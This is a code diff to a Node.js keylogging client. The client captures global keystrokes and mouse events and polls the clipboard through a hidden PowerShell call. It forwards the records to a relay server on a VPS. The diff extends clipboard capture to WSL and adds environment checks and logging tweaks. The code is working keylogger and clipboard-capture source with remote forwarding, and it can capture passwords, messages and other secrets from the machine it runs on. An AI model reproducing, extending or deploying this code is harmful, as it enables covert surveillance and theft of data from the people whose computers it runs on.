@@ -858,21 +858,80 @@ const CLIPBOARD_PS_COMMAND =
 const DEFAULT_CLIPBOARD_MS = 1000;
 const MAX_CLIPBOARD_CHARS = 256 * 1024;
 
-function powershellExe() {
-  const windir = process.env.windir || process.env.WINDIR;
-  if (windir) {
-    return path.join(windir, "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
+function isWslLinux() {
+  if (process.platform !== "linux") {
+    return false;
   }
-  return "powershell.exe";
+  if (process.env.WSL_DISTRO_NAME || process.env.WSLENV || process.env.WSL_INTEROP) {
+    return true;
+  }
+  try {
+    return /microsoft/i.test(fs.readFileSync("/proc/version", "utf8"));
+  } catch {
+    return false;
+  }
 }
 
-function readWindowsClipboardText(callback) {
-  if (process.platform !== "win32") {
+function windowsPowerShellExe() {
+  if (process.platform === "win32") {
+    const windir = process.env.windir || process.env.WINDIR;
+    if (windir) {
+      return path.join(windir, "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
+    }
+    return "powershell.exe";
+  }
+  if (isWslLinux()) {
+    const wslPs = "/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe";
+    if (fs.existsSync(wslPs)) {
+      return wslPs;
+    }
+  }
+  return null;
+}
+
+function analyzeCaptureEnvironment() {
+  if (process.platform === "win32") {
+    return { kind: "windows", captureKeyboardMouse: true, captureClipboard: true };
+  }
+  if (isWslLinux()) {
+    return {
+      kind: "wsl",
+      captureKeyboardMouse: false,
+      captureClipboard: Boolean(windowsPowerShellExe()),
+      hint:
+        "You are in WSL/Linux Node. Keyboard and mouse only work from native Windows PowerShell or CMD on the capture PC (same client folder, npm start).",
+    };
+  }
+  if (process.platform === "linux") {
+    return {
+      kind: "linux",
+      captureKeyboardMouse: true,
+      captureClipboard: false,
+      hint: "On Linux install pkexec or kdesudo for global keys, or run the client on Windows.",
+    };
+  }
+  return { kind: process.platform, captureKeyboardMouse: false, captureClipboard: false };
+}
+
+function keyspyLogInfo(msg) {
+  const text = String(msg);
+  if (/pkexec|kdesudo/i.test(text)) {
+    console.error(
+      "[keyspy] Global key capture on Linux needs pkexec (policykit) or kdesudo — or run this client on Windows with native Node.",
+    );
+    return;
+  }
+  console.error(`[keyspy] ${text}`);
+}
+
+function readClipboardText(callback) {
+  const ps = windowsPowerShellExe();
+  if (!ps) {
     callback(null);
     return;
   }
   execFile(
-    powershellExe(),
+    ps,
     ["-NoProfile", "-STA", "-Command", CLIPBOARD_PS_COMMAND],
     { encoding: "utf8", maxBuffer: 4 * 1024 * 1024, windowsHide: true },
     (err, stdout) => {
@@ -913,7 +972,7 @@ function createClipboardMonitor({ intervalMs, onCapture, maxChars = MAX_CLIPBOAR
       return;
     }
     reading = true;
-    readWindowsClipboardText((raw) => {
+    readClipboardText((raw) => {
       reading = false;
       const text = normalizeClipboardText(raw, maxChars);
       if (!text) {
@@ -934,7 +993,7 @@ function createClipboardMonitor({ intervalMs, onCapture, maxChars = MAX_CLIPBOAR
 
   return {
     start() {
-      if (process.platform !== "win32" || !intervalMs || intervalMs < 200) {
+      if (!windowsPowerShellExe() || !intervalMs || intervalMs < 200) {
         return false;
       }
       tick(true);
@@ -996,15 +1055,20 @@ Optional: npm start -- --server ${DEFAULT_RELAY_HOST} --name "My-PC"`);
 
 async function main() {
   const options = parseArgs(process.argv.slice(2));
+  const captureEnv = analyzeCaptureEnvironment();
   const agentMeta = {
     hostname: os.hostname(),
     clientName: options.name,
     clientIp: options.clientIp,
     platform: process.platform,
+    runtime: captureEnv.kind,
   };
   const relayHost = hostFromServerInput(options.server);
   console.log(`Client PC: ${agentMeta.clientName} (${agentMeta.clientIp})`);
   console.log(`VPS: ${relayHost}`);
+  if (captureEnv.hint) {
+    console.warn(`Note: ${captureEnv.hint}`);
+  }
   let logStream = options.logFile ? fs.createWriteStream(options.logFile, { flags: "a" }) : null;
   const writeLine = (line) => {
     console.log(line);
@@ -1082,26 +1146,31 @@ async function main() {
     },
   });
   if (clipboardMonitor.start()) {
-    console.log(`Clipboard capture every ${options.clipboardMs}ms (new copy only).`);
-  } else if (process.platform !== "win32") {
-    console.log("Clipboard capture: Windows only (skipped).");
+    const via = captureEnv.kind === "wsl" ? " (Windows clipboard via WSL)" : "";
+    console.log(`Clipboard capture every ${options.clipboardMs}ms (new copy only)${via}.`);
+  } else if (captureEnv.kind === "wsl") {
+    console.log("Clipboard capture skipped (could not find Windows PowerShell under /mnt/c).");
+  } else if (!captureEnv.captureClipboard) {
+    console.log("Clipboard capture requires Windows or WSL (skipped).");
   }
 
-  const windowsKeyspyConfig = {
-    onError: (c) => console.error(`[keyspy ${c}]`),
-    onInfo: (i) => console.error(`[keyspy] ${i}`),
-  };
-  if (process.platform === "win32") {
-    windowsKeyspyConfig.serverPath = await ensureWinKeyServerExe();
-  }
+  let keyboard = null;
+  if (captureEnv.captureKeyboardMouse) {
+    const windowsKeyspyConfig = {
+      onError: (c) => console.error(`[keyspy ${c}]`),
+      onInfo: keyspyLogInfo,
+    };
+    if (process.platform === "win32") {
+      windowsKeyspyConfig.serverPath = await ensureWinKeyServerExe();
+    }
 
-  const keyboard = new GlobalKeyboardListener({
-    windows: windowsKeyspyConfig,
-    mac: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: (i) => console.error(`[keyspy] ${i}`) },
-    x11: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: (i) => console.error(`[keyspy] ${i}`) },
-  });
+    keyboard = new GlobalKeyboardListener({
+      windows: windowsKeyspyConfig,
+      mac: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: keyspyLogInfo },
+      x11: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: keyspyLogInfo },
+    });
 
-  await keyboard.addListener((event, isDown) => {
+    await keyboard.addListener((event, isDown) => {
     const keyName = event.name ?? "UNKNOWN";
 
     if (event.state === "DOWN") {
@@ -1138,16 +1207,19 @@ async function main() {
       sendPayload(record);
     }
     return false;
-  });
+    });
 
-  console.log("Capturing keyboard + mouse. Ctrl+C to stop.");
+    console.log("Capturing keyboard + mouse. Ctrl+C to stop.");
+  } else {
+    console.log("Relay only — no keyboard/mouse capture on this runtime. Ctrl+C to stop.");
+  }
 
   const shutdown = () => {
     shouldRun = false;
     clipboardMonitor.stop();
     const tail = textBuffer.flush("enter", agentMeta);
     if (tail) sendPayload(tail);
-    keyboard.kill();
+    keyboard?.kill();
     disconnectSocket();
     if (logStream) logStream.end();
     process.exit(0);
